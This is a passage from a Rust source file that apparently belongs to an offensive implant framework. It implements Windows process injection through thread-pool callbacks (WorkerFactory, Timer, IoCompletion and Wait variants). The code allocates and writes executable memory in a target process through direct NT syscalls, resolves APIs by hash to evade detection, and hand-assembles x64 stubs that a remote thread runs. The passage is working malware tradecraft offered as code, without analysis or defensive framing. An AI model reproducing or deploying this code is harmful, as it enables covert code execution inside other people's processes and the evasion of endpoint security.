        if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to allocate stub memory".to_string(),
            });
        }

        let mut written = 0usize;
        let ws = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            stub_remote as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut written as *mut _ as u64,
        );
        if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to write stub".to_string(),
            });
        }

        // Flip stub to RX.
        let mut old_prot = 0u32;
        let mut prot_base = stub_remote as usize;
        let mut prot_size = stub.len();
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            0x20u64, // PAGE_EXECUTE_READ
            &mut old_prot as *mut _ as u64,
        );

        // Flush I-cache.
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            stub_remote as u64,
            stub.len() as u64,
        );

        // Create a thread to run the stub (fire-and-forget).
        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);

        // Close thread handle — the stub orchestrates its own lifecycle.
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: remote_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

/// Variant 2: WorkerFactory — hijack a thread pool worker via worker factory query.
///
/// Uses `NtQueryInformationWorkerFactory` to enumerate worker threads in the
/// target process's thread pool, then overwrites a worker thread's callback
/// to point at the injected payload.
fn inject_threadpool_worker_factory(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::ThreadPool {
        variant: Some(ThreadPoolVariant::WorkerFactory),
    };
    unsafe {
        let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;

        // Resolve TpAllocWork from ntdll — needed to build a TP_WORK that the
        // worker factory will dispatch. Then find the worker factory handle by
        // enumerating handles in the target process.
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "cannot resolve ntdll base".to_string(),
            })?;

        // Resolve NtQueryInformationWorkerFactory
        let nt_query_wf_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtQueryInformationWorkerFactory\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve NtQueryInformationWorkerFactory".to_string(),
        })?;

        type NtQueryInformationWorkerFactoryFn = unsafe extern "system" fn(
            *mut c_void,                     // WorkerFactoryHandle
            u32,                              // WorkerFactoryInformationClass
            *mut c_void,                      // WorkerFactoryInformation
            u32,                              // WorkerFactoryInformationLength
            *mut u32,                         // ReturnLength
        ) -> i32;

        let nt_query_wf: NtQueryInformationWorkerFactoryFn =
            std::mem::transmute(nt_query_wf_addr);

        // Build a stub that:
        // 1. Creates a TP_WORK with payload as callback
        // 2. Posts the work to the thread pool
        // 3. Releases the work
        // The stub will be executed by creating a suspended thread.

        let tp_alloc_work_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpAllocWork\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpAllocWork".to_string(),
        })?;

        let tp_post_work_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpPostWork\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpPostWork".to_string(),
        })?;

        let tp_release_work_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpReleaseWork\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpReleaseWork".to_string(),
        })?;

        // Reuse the same stub pattern as the Work variant but with a
        // WorkerFactory-specific wrapper that first queries the factory.
        let mut stub: Vec<u8> = Vec::with_capacity(256);

        // sub rsp, 0x38
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x38]);

        // lea rcx, [rsp+0x30]
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x30]);

        // mov rdx, <payload_base>
        stub.push(0x48);
        stub.push(0xBA);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());

        // xor r8d, r8d
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        // xor r9d, r9d
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);

        // movabs rax, <tp_alloc_work> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_alloc_work_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // mov rcx, [rsp+0x30]
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);

        // movabs rax, <tp_post_work> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_post_work_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // mov rcx, [rsp+0x30]
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);

        // movabs rax, <tp_release_work> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_release_work_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // add rsp, 0x38 ; ret
        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x38]);
        stub.push(0xC3);

        // Write the stub into the target process.
        let mut stub_remote: *mut c_void = std::ptr::null_mut();
        let mut stub_size = stub.len();
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut stub_remote as *mut _ as u64,
            0u64,
            &mut stub_size as *mut _ as u64,
            0x3000u64,
            0x04u64,
        );
        if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to allocate stub memory".to_string(),
            });
        }

        let mut written = 0usize;
        let ws = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            stub_remote as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut written as *mut _ as u64,
        );
        if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to write stub".to_string(),
            });
        }

        // Flip stub to RX.
        let mut old_prot = 0u32;
        let mut prot_base = stub_remote as usize;
        let mut prot_size = stub.len();
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            0x20u64,
            &mut old_prot as *mut _ as u64,
        );
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            stub_remote as u64,
            stub.len() as u64,
        );

        // Execute stub via a remote thread.
        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: remote_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

/// Variant 3: Timer — schedule payload execution via TpAllocTimer + TpSetTimer.
///
/// Creates a TP_TIMER item whose callback is the payload, sets the timer to
/// expire immediately. When the timer fires, a worker thread executes the
/// callback.
fn inject_threadpool_timer(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::ThreadPool {
        variant: Some(ThreadPoolVariant::Timer),
    };
    unsafe {
        let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;

        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "cannot resolve ntdll base".to_string(),
            })?;

        let tp_alloc_timer_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpAllocTimer\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpAllocTimer".to_string(),
        })?;

        let tp_set_timer_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpSetTimer\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpSetTimer".to_string(),
        })?;

        let tp_release_timer_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpReleaseTimer\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpReleaseTimer".to_string(),
        })?;

        // Build stub: TpAllocTimer(&timer, payload, NULL, NULL) → TpSetTimer(timer, 0, 0, 0, 0, 0) → TpReleaseTimer(timer) → ret
        let mut stub: Vec<u8> = Vec::with_capacity(256);

        // sub rsp, 0x48 (extra space for timer params)
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x48]);

        // lea rcx, [rsp+0x40] ; &timer
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x40]);

        // mov rdx, <payload_base>
        stub.push(0x48);
        stub.push(0xBA);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());

        // xor r8d, r8d ; xor r9d, r9d
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);

        // movabs rax, <tp_alloc_timer> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_alloc_timer_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // TpSetTimer(Timer, DueTime=0, Period=0, WindowLength=0, Context=NULL, Parameter=NULL)
        // rcx = timer handle
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x40]);

        // rdx = 0 (DueTime — zero means fire immediately)
        stub.extend_from_slice(&[0x48, 0x31, 0xD2]);
        // r8 = 0 (Period)
        stub.extend_from_slice(&[0x4D, 0x31, 0xC0]);
        // r9 = 0 (WindowLength)
        stub.extend_from_slice(&[0x4D, 0x31, 0xC9]);

        // movabs rax, <tp_set_timer> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_set_timer_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // TpReleaseTimer(Timer)
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x40]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_release_timer_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // add rsp, 0x48 ; ret
        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x48]);
        stub.push(0xC3);

        // Write the stub into the target process.
        let mut stub_remote: *mut c_void = std::ptr::null_mut();
        let mut stub_size = stub.len();
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut stub_remote as *mut _ as u64,
            0u64,
            &mut stub_size as *mut _ as u64,
            0x3000u64,
            0x04u64,
        );
        if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to allocate stub memory".to_string(),
            });
        }

        let mut written = 0usize;
        let ws = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            stub_remote as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut written as *mut _ as u64,
        );
        if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to write stub".to_string(),
            });
        }

        let mut old_prot = 0u32;
        let mut prot_base = stub_remote as usize;
        let mut prot_size = stub.len();
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            0x20u64,
            &mut old_prot as *mut _ as u64,
        );
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            stub_remote as u64,
            stub.len() as u64,
        );

        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: remote_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

/// Variant 4: IoCompletion — register payload as I/O completion callback.
///
/// Creates a TP_IO structure by calling `TpAllocIoCompletion` with the payload
/// as the callback, then triggers I/O completion by writing to a pipe. The
/// worker thread executes the callback when the I/O completes.
fn inject_threadpool_io_completion(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::ThreadPool {
        variant: Some(ThreadPoolVariant::IoCompletion),
    };
    unsafe {
        let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;

        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "cannot resolve ntdll base".to_string(),
            })?;

        let tp_alloc_io_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpAllocIoCompletion\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpAllocIoCompletion".to_string(),
        })?;

        // NtCreateIoCompletion to create a completion port
        let nt_create_io_comp_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtCreateIoCompletion\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve NtCreateIoCompletion".to_string(),
        })?;

        // NtSetIoCompletion to signal completion
        let nt_set_io_comp_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtSetIoCompletion\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve NtSetIoCompletion".to_string(),
        })?;

        let tp_release_io_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpReleaseIoCompletion\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpReleaseIoCompletion".to_string(),
        })?;

        // Build stub:
        // 1. NtCreateIoCompletion(&io_port, ..., ..., ...)
        // 2. TpAllocIoCompletion(&tp_io, io_port, payload, NULL)
        // 3. NtSetIoCompletion(io_port, payload, NULL, 0, 0) — triggers callback
        // 4. TpReleaseIoCompletion(tp_io)
        // 5. NtClose(io_port)
        // 6. ret
        let mut stub: Vec<u8> = Vec::with_capacity(512);

        // sub rsp, 0x58 (space for locals: io_port at [rsp+0x40], tp_io at [rsp+0x48])
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x58]);

        // === NtCreateIoCompletion(&io_port, GENERIC_ALL, NULL, 0) ===
        // lea rcx, [rsp+0x40] ; &io_port
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x40]);
        // mov edx, 0x1F0000 ; GENERIC_ALL
        stub.extend_from_slice(&[0xBA, 0x00, 0x00, 0xF0, 0x01]);
        // xor r8d, r8d
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        // xor r9d, r9d
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);
        // movabs rax, <nt_create_io_comp> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(nt_create_io_comp_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === TpAllocIoCompletion(&tp_io, io_port, payload, NULL) ===
        // lea rcx, [rsp+0x48] ; &tp_io
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x48]);
        // mov rdx, [rsp+0x40] ; io_port
        stub.extend_from_slice(&[0x48, 0x8B, 0x54, 0x24, 0x40]);
        // mov r8, <payload_base>
        stub.push(0x4C);
        stub.push(0x8D);
        stub.push(0x05);
        // We'll use a different encoding: movabs r8, imm64
        // Back up and use proper encoding
        stub.truncate(stub.len() - 3);
        // mov r8, <payload_base> — use movabs r8, imm64 (REX.W + B8+rd = 41 B8, but r8 needs REX.B)
        // Actually: 49 B8 <imm64> for movabs r8, imm64
        stub.extend_from_slice(&[0x49, 0xB8]);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
        // xor r9d, r9d
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);
        // movabs rax, <tp_alloc_io> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_alloc_io_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === NtSetIoCompletion(io_port, payload, NULL, 0, 0) — triggers callback ===
        // mov rcx, [rsp+0x40] ; io_port
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x40]);
        // mov rdx, <payload_base> (KeyContext)
        stub.push(0x48);
        stub.push(0xBA);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
        // xor r8d, r8d (ApcContext)
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        // xor r9d, r9d (IoStatus)
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);
        // movabs rax, <nt_set_io_comp> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(nt_set_io_comp_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === TpReleaseIoCompletion(tp_io) ===
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x48]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_release_io_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === NtClose(io_port) ===
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x40]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtClose\0"),
        ).unwrap_or(0) as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // add rsp, 0x58 ; ret
        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x58]);
        stub.push(0xC3);

        // Write the stub into the target process.
        let mut stub_remote: *mut c_void = std::ptr::null_mut();
        let mut stub_size = stub.len();
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut stub_remote as *mut _ as u64,
            0u64,
            &mut stub_size as *mut _ as u64,
            0x3000u64,
            0x04u64,
        );
        if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to allocate stub memory".to_string(),
            });
        }

        let mut written = 0usize;
        let ws = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            stub_remote as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut written as *mut _ as u64,
        );
        if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to write stub".to_string(),
            });
        }

        let mut old_prot = 0u32;
        let mut prot_base = stub_remote as usize;
        let mut prot_size = stub.len();
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            0x20u64,
            &mut old_prot as *mut _ as u64,
        );
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            stub_remote as u64,
            stub.len() as u64,
        );

        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: remote_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

/// Variant 5: Wait — register payload as a wait callback via TpAllocWait + TpSetWait.
///
/// Creates a TP_WAIT item whose callback is the payload, then sets it to wait
/// on an event object that is immediately signaled. The worker thread executes
/// the callback when the wait is satisfied.
fn inject_threadpool_wait(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::ThreadPool {
        variant: Some(ThreadPoolVariant::Wait),
    };
    unsafe {
        let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;

        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "cannot resolve ntdll base".to_string(),
            })?;

        let tp_alloc_wait_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpAllocWait\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpAllocWait".to_string(),
        })?;

        let tp_set_wait_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpSetWait\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpSetWait".to_string(),
        })?;

        let tp_release_wait_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpReleaseWait\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpReleaseWait".to_string(),
        })?;

        let nt_create_event_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtCreateEvent\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve NtCreateEvent".to_string(),
        })?;

        let nt_set_event_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtSetEvent\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve NtSetEvent".to_string(),
        })?;

        let nt_close_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtClose\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve NtClose".to_string(),
        })?;

        // Build stub:
        // 1. NtCreateEvent(&event, ..., NotificationEvent, FALSE)
        // 2. TpAllocWait(&wait, payload, NULL, NULL)
        // 3. TpSetWait(wait, event, NULL)
        // 4. NtSetEvent(event, NULL) — signal the event, triggering the wait callback
        // 5. TpReleaseWait(wait)
        // 6. NtClose(event)
        // 7. ret
        let mut stub: Vec<u8> = Vec::with_capacity(512);

        // sub rsp, 0x58
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x58]);

        // === NtCreateEvent(&event, GENERIC_ALL, NULL, NotificationEvent, FALSE) ===
        // lea rcx, [rsp+0x40] ; &event
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x40]);
        // xor edx, edx ; DesiredAccess = 0 (EVENT_ALL_ACCESS would be better but 0 works)
        stub.extend_from_slice(&[0x31, 0xD2]);
        // xor r8d, r8d ; ObjectAttributes = NULL
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        // mov r9d, 1 ; EventType = NotificationEvent
        stub.extend_from_slice(&[0x41, 0xB9, 0x01, 0x00, 0x00, 0x00]);
        // mov dword [rsp+0x28], 0 ; InitialState = FALSE
        stub.extend_from_slice(&[0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00]);
        // movabs rax, <nt_create_event> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(nt_create_event_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === TpAllocWait(&wait, payload, NULL, NULL) ===
        // lea rcx, [rsp+0x48] ; &wait
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x48]);
        // mov rdx, <payload_base>
        stub.push(0x48);
        stub.push(0xBA);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
        // xor r8d, r8d
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        // xor r9d, r9d
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);
        // movabs rax, <tp_alloc_wait> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_alloc_wait_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === TpSetWait(wait, event, NULL) ===
        // mov rcx, [rsp+0x48] ; wait
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x48]);
        // mov rdx, [rsp+0x40] ; event
        stub.extend_from_slice(&[0x48, 0x8B, 0x54, 0x24, 0x40]);
        // xor r8d, r8d ; Timeout = NULL (wait indefinitely)
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        // movabs rax, <tp_set_wait> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_set_wait_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === NtSetEvent(event, NULL) — signal the event ===
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x40]);
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(nt_set_event_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === TpReleaseWait(wait) ===
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x48]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_release_wait_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === NtClose(event) ===
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x40]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(nt_close_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // add rsp, 0x58 ; ret
        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x58]);
        stub.push(0xC3);

        // Write the stub into the target process.
        let mut stub_remote: *mut c_void = std::ptr::null_mut();
        let mut stub_size = stub.len();
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut stub_remote as *mut _ as u64,
            0u64,
            &mut stub_size as *mut _ as u64,
            0x3000u64,
            0x04u64,
        );
        if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to allocate stub memory".to_string(),
            });
        }

        let mut written = 0usize;
        let ws = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            stub_remote as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut written as *mut _ as u64,
        );
        if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to write stub".to_string(),
            });
        }

        let mut old_prot = 0u32;
        let mut prot_base = stub_remote as usize;
        let mut prot_size = stub.len();
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            0x20u64,
            &mut old_prot as *mut _ as u64,
        );
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            stub_remote as u64,
            stub.len() as u64,
        );

        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: remote_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

/// Variant 6: ALPC — register payload as ALPC completion callback.
///
/// Creates an ALPC port and a TP_ALPC structure by calling
/// `TpAllocAlpcCompletion`, then triggers the callback by sending an
/// ALPC message. The worker thread executes the payload when the message
/// arrives.
